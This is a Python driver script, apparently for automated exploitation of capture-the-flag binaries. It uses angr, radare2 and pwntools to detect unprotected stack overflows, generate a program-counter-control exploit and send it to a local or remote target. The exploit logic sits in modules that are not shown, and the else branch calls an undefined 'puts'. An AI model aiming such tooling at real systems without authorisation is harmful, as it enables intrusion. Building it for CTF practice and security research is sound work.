from __future__ import print_function
from shutil import which
import argparse
import logging
import os
from vul_rules import stdinDetector
from vul_rules import getShellFunctionDetector
from vul_rules import protectionDetector
from vul_rules import overflowDetector
from vul_rules import formatDetector
from vul_rules import overflowExploiter
from vul_rules import overflowExploitSender

import PwnContext as pwn
from fileinput import filename
from gevent import kill
from py import process
import r2pipe
import json
import sys

import IPython

import angr
from angr.storage.memory_mixins.address_concretization_mixin import MultiwriteAnnotation
logging.basicConfig()
logging.root.setLevel(logging.INFO)
pwn.context.log_level = 'debug'
pwn.context.arch = 'amd64'

loud_loggers = [
    "angr.engines",
    "angr.sim_manager",
    "angr.simos",
    "angr.project",
    "angr.procedures",
    "cle",
    "angr.storage",
    "pyvex.expr",
]
log = logging.getLogger(__name__)

def is_radare_installed():
    return which("r2") is not None


def main():
    libpath = "/home/shawking/glibc-all-in-one/"
    if not is_radare_installed():
        log.info("[-] Error radare2 is not installed.")
        exit(1)
    parser = argparse.ArgumentParser()
    parser.add_argument("file", help="File to analyze")
    parser.add_argument("-v", "--verbose", help="Verbose mode", action="store_true", default=False)
    parser.add_argument("-l", "--libc", help="libc to use", default="/usr/lib/x86_64-linux-gnu/libc-2.31.so")  
    parser.add_argument("-u", "--url", help="Remote URL to pwn", default="")
    parser.add_argument("-p", "--port", help="Remote port to pwn", default=0, type=int)
    parser.add_argument(
        "--no_getShell",
        default=False,
        action="store_true",
        help="Skip win function checking",
    )
    args = parser.parse_args()

    if args.file is None:
        log.info("[-] Exitting no file specified")
        exit(1)
    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    if not args.verbose:
        for loud_logger in loud_loggers:
            logging.getLogger(loud_logger).setLevel(logging.ERROR)
            logging.getLogger("angr.project").disabled = True   

    args.file = os.path.abspath(args.file)
    properties = {}
    properties["input_type"] = stdinDetector.checkInputType(args.file)
    properties["libc"] = args.libc
    properties["file"] = args.file
    properties["format"] = {}
    properties["overflow"] = {}
    log.info("[+] Checking pwn type...")

    properties["getshell_functions"] = []
    if not args.no_getShell:
        properties["getshell_functions"] = getShellFunctionDetector.getShellFunctions(args.file)
    log.info("[+] Getting binary protections ")
    # print(properties["getshell_functions"])
    properties["protections"] = protectionDetector.getProperties(args.file)
    #print(properties["protections"]["nx"])
    if(properties["protections"]["canary"] == False):
        log.info("[+] Checking for overflow ...")
        properties["overflow"] = overflowDetector.checkOverflow(args.file, inputType=properties["input_type"])
        # properties["format"] = formatDetector.checkFormat(args.file, inputType=properties["input_type"])
        # print(properties["format"]["type"])
        print(properties["overflow"]["type"])
        if(properties["overflow"]["type"] == "Overflow_pc"):
            log.info("[+] Exploiting overflow pc")
            properties["overflow"]["results"] = {}
            properties["overflow"]["results"] = overflowExploiter.exploitOverflow(args.file, properties, inputType=properties["input_type"])
            # print(properties["overflow"]["results"]["type"])
            if properties["overflow"]["results"]["type"]:

                # print(isinstance(properties["libc"], dict))
                properties["send_results"] = overflowExploitSender.sendExploit(args.file, properties)

            
    else:
        puts("Exits canary")
if __name__ == '__main__':
    main()


